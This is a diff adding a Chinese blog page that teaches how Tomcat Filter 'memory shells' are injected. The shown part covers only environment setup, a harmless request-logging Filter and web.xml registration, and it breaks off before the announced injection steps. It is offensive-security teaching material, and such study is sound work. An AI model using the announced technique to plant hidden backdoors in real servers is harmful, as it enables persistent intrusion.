@@ -1,0 +1,1330 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | Filter —— Tomcat 内存马从零到注入 - blog</title>
+
+  
+    <meta name="description" content="代码审计 | Filter —— Tomcat 内存马从零到注入目录 一、快速搭建环境 二、Filter 是什么，正常怎么用 代码解释 web.xml 方式注册 Filter 两种静态注册方式对比   三、StandardContext 中的三个核心 Filter 集合 三者的协作流程 对内存马的关键意义   四、动态注册：绕过 web.xml 注入 Filter 内存马 第一步：拿到 Stand">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | Filter —— Tomcat 内存马从零到注入">
+<meta property="og:url" content="https://wr0ld.github.io/posts/7b9eb72d/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="代码审计 | Filter —— Tomcat 内存马从零到注入目录 一、快速搭建环境 二、Filter 是什么，正常怎么用 代码解释 web.xml 方式注册 Filter 两种静态注册方式对比   三、StandardContext 中的三个核心 Filter 集合 三者的协作流程 对内存马的关键意义   四、动态注册：绕过 web.xml 注入 Filter 内存马 第一步：拿到 Stand">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-09T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-09T04:26:30.694Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Tomcat">
+<meta property="article:tag" content="Filter">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,Tomcat,Filter,内存马,RCE">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-09T12:00:00+08:00","dateModified":"2026-04-09T12:26:30+08:00","datePublished":"2026-04-09T12:00:00+08:00","description":"","headline":"代码审计 | Filter —— Tomcat 内存马从零到注入","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/7b9eb72d/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/7b9eb72d/","keywords":"代码审计, Java, Tomcat, Filter, 内存马, RCE","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/a53ac47220f258c36a78197dace351f3-scaled.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(11)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">log4j 内存马</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-09T04:00:00.000Z">2026-04-09</time></span><span class="sep"></span><span class="text word-count">字数：15454</span><span class="sep"></span><span class="text img-count">图片：10</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | Filter —— Tomcat 内存马从零到注入</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="代码审计-Filter-——-Tomcat-内存马从零到注入"><a href="#代码审计-Filter-——-Tomcat-内存马从零到注入" class="headerlink" title="代码审计 | Filter —— Tomcat 内存马从零到注入"></a>代码审计 | Filter —— Tomcat 内存马从零到注入</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83">一、快速搭建环境</a></li>
+<li><a href="#%E4%BA%8Cfilter-%E6%98%AF%E4%BB%80%E4%B9%88%E6%AD%A3%E5%B8%B8%E6%80%8E%E4%B9%88%E7%94%A8">二、Filter 是什么，正常怎么用</a><ul>
+<li><a href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A">代码解释</a></li>
+<li><a href="#webxml-%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%86%8C-filter">web.xml 方式注册 Filter</a></li>
+<li><a href="#%E4%B8%A4%E7%A7%8D%E9%9D%99%E6%80%81%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94">两种静态注册方式对比</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89standardcontext-%E4%B8%AD%E7%9A%84%E4%B8%89%E4%B8%AA%E6%A0%B8%E5%BF%83-filter-%E9%9B%86%E5%90%88">三、StandardContext 中的三个核心 Filter 集合</a><ul>
+<li><a href="#%E4%B8%89%E8%80%85%E7%9A%84%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B">三者的协作流程</a></li>
+<li><a href="#%E5%AF%B9%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%85%B3%E9%94%AE%E6%84%8F%E4%B9%89">对内存马的关键意义</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E7%BB%95%E8%BF%87-webxml-%E6%B3%A8%E5%85%A5-filter-%E5%86%85%E5%AD%98%E9%A9%AC">四、动态注册：绕过 web.xml 注入 Filter 内存马</a><ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E6%8B%BF%E5%88%B0-standardcontext">第一步：拿到 StandardContext</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E5%AE%9A%E4%B9%89%E6%81%B6%E6%84%8F-filter%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB">第二步：定义恶意 Filter（匿名内部类）</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%E6%B3%A8%E5%86%8C-filterdef%E5%8A%A0%E5%85%A5%E6%A1%A3%E6%A1%88%E6%9F%9C">第三步：注册 FilterDef</a></li>
+<li><a href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%E6%B3%A8%E5%86%8C-filtermap%E5%8A%A0%E5%85%A5%E6%8E%92%E7%8F%AD%E8%A1%A8">第四步：注册 FilterMap</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%E5%85%B3%E9%94%AE%E5%BC%BA%E5%88%B6%E5%86%99%E5%85%A5-filterconfigs">第五步（关键）：强制写入 filterConfigs</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4%E6%B3%A8%E5%85%A5-jsp-%E4%B8%8E%E9%AA%8C%E8%AF%81">完整注入 JSP 与验证</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%94%E6%80%BB%E7%BB%93%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9C%AC%E8%B4%A8">五、总结</a></li>
+</ul>
+<hr>
+<h2 id="一、快速搭建环境"><a href="#一、快速搭建环境" class="headerlink" title="一、快速搭建环境"></a>一、快速搭建环境</h2><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>先在 IDEA 里快速创建一个 Jakarta EE（原 Java EE）项目。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image1.png"></p>
+<p>注意：Jakarta EE 高版本需要高版本的 JDK，这里换成低版本的 Java EE 8 就行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image2.png"></p>
+<h3 id="导入-Tomcat-依赖"><a href="#导入-Tomcat-依赖" class="headerlink" title="导入 Tomcat 依赖"></a>导入 Tomcat 依赖</h3><p>导入 Tomcat 的本地依赖 <code>lib/</code>，把整个 lib 目录加进去（也可以用 Maven 重新下载）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image3.png"></p>
+<h3 id="配置热加载"><a href="#配置热加载" class="headerlink" title="配置热加载"></a>配置热加载</h3><p>修改配置支持热加载（也可以在 xml 里配置）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image4.png"></p>
+<blockquote>
+<p>如果终端出现中文乱码，可以添加启动参数 <code>-Dfile.encoding=UTF-8</code></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image5.png"></p>
+<h3 id="直接启动"><a href="#直接启动" class="headerlink" title="直接启动"></a>直接启动</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image6.png"></p>
+<p>没有报错，环境搭好了。</p>
+<hr>
+<h2 id="二、Filter-是什么，正常怎么用"><a href="#二、Filter-是什么，正常怎么用" class="headerlink" title="二、Filter 是什么，正常怎么用"></a>二、Filter 是什么，正常怎么用</h2><p>先写一个最简单的 Filter 例子，比如”记录每次请求的 IP”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LogFilter 初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        System.out.println(<span class="string">&quot;请求来自：&quot;</span> + ip);</span><br><span class="line">        <span class="comment">// 放行，继续执行后续 Filter 或 Servlet</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;LogFilter 销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动 web 后随便访问一个网页 <code>http://localhost:8080/</code>，控制台输出了一次初始化，每次请求都会多一条记录。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image7.png"></p>
+<p>点击红色方框停止服务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image8.png"></p>
+<p>显示 <code>LogFilter 销毁</code>。</p>
+<hr>
+<h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p><strong><code>@WebFilter(&quot;/*&quot;)</code></strong></p>
+<p>告诉 Servlet 容器（Tomcat）这是一个过滤器，并且拦截所有 URL 路径（<code>/*</code> 表示任意路径）。这样就不需要写 web.xml 配置了。</p>
+<blockquote>
+<p><strong>内存马关联</strong>：后面要做的就是<strong>不使用注解，也不写 web.xml，直接通过反射把恶意 Filter 塞进 Tomcat 内部的那个管理结构中</strong>。</p>
+</blockquote>
+<hr>
+<p><strong><code>@Override</code></strong></p>
+<p>告诉编译器下面的方法是重写接口，不是自己新建的。因为 Filter 接口里已经声明了 <code>init</code>、<code>doFilter</code>、<code>destroy</code> 三个方法（<code>public class LogFilter implements Filter</code> 里的 <code>implements Filter</code> 就是<strong>实现接口</strong>的意思）。</p>
+<blockquote>
+<p><strong>extends 和 implements 的区别</strong>：<code>继承（extends）</code> 用于<strong>类与类</strong>之间，子类继承父类的属性和方法；<code>实现（implements）</code> 用于<strong>类与接口</strong>之间。</p>
+</blockquote>
+<p>加了 <code>@Override</code> 的好处是：如果把 <code>init</code> 写成了 <code>int</code>，编译器会直接报错，因为 Filter 接口里没有这个方法。不写的话不会报错，照样跑，但可能出现隐蔽的 bug。</p>
+<hr>
+<p><strong><code>public void init(FilterConfig filterConfig)</code></strong></p>
+<p>Tomcat 启动、<strong>第一次加载这个 Filter 类并实例化后</strong>立即调用一次。<code>FilterConfig</code> 包含 Filter 的配置信息（例如 web.xml 中设置的初始化参数）。</p>
+<hr>
+<p><strong><code>public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</code></strong></p>
+<p><strong>每次有 HTTP 请求匹配到该 Filter 的拦截路径时</strong>，Tomcat 就会调用这个方法。三个参数完全由 <code>javax.servlet.Filter</code> 接口规定死了，不能随便改（注意是 <code>javax.servlet</code> 包下的）。</p>
+<hr>
+<p><strong><code>chain.doFilter(request, response)</code></strong></p>
+<p>Filter 的完整处理流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → Filter1.doFilter → Filter2.doFilter → ... → Servlet/JSP → 响应</span><br></pre></td></tr></table></figure>
+
+<p><code>chain</code> 是一个”过滤器链”对象，管理着当前请求需要经过的所有 Filter 的顺序。</p>
+<p><code>chain.doFilter(request, response)</code> 的作用是：”当前 Filter 的事情做完了，请把请求和响应交给<strong>下一个环节</strong>继续处理。”</p>
+<p><strong>如果注释掉这一行</strong>，请求就会<strong>卡在当前 Filter 里</strong>，永远到不了后面的环节，浏览器会一直转圈等待或者直接返回空白页面。</p>
+<hr>
+<p><strong><code>public void destroy()</code></strong></p>
+<p>Tomcat <strong>正常关闭或卸载该 Web 应用时</strong>，容器会调用 <code>destroy</code> 方法。</p>
+<p><strong>Filter 的生命周期</strong>：</p>
+<ul>
+<li><code>init</code>：Tomcat <strong>启动</strong>、加载 Filter 时调用一次。</li>
+<li><code>doFilter</code>：每次<strong>请求匹配</strong>时调用。</li>
+<li><code>destroy</code>：Tomcat <strong>正常关闭</strong>时调用一次。</li>
+</ul>
+<hr>
+<h3 id="web-xml-方式注册-Filter"><a href="#web-xml-方式注册-Filter" class="headerlink" title="web.xml 方式注册 Filter"></a>web.xml 方式注册 Filter</h3><p>除了 <code>@WebFilter(&quot;/*&quot;)</code> 这种注解方式，还能通过改 web.xml 文件注册。</p>
+<p>在项目的 <code>src/main/webapp/WEB-INF/web.xml</code> 的 <code>&lt;web-app&gt;</code> 里面添加：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 声明 Filter：给 Filter 起个内部名字，并指定它对应的 Java 类 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filter.LogFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 映射 Filter：告诉 Tomcat 这个 Filter 要拦截哪些 URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image9.png"></p>
+<p><strong><code>&lt;filter&gt;</code> 部分：</strong></p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>含义</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;filter-name&gt;</code></td>
+<td>给这个 Filter 起一个<strong>内部使用的名字</strong></td>
+<td>可以随便取，只要在这个 web.xml 里唯一即可，但通常用类名的小写形式</td>
+</tr>
+<tr>
+<td><code>&lt;filter-class&gt;</code></td>
+<td>指定这个 Filter 对应的 <strong>Java 类的全限定名</strong></td>
+<td>Tomcat 会根据这个字符串去 WEB-INF&#x2F;classes 或 lib 目录下找对应的 .class 文件，然后通过反射 <code>Class.forName()</code> 加载并实例化它</td>
+</tr>
+</tbody></table>
+<p><strong><code>&lt;filter-mapping&gt;</code> 部分：</strong></p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>含义</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;filter-name&gt;</code></td>
+<td>关联上面声明的 Filter 名字</td>
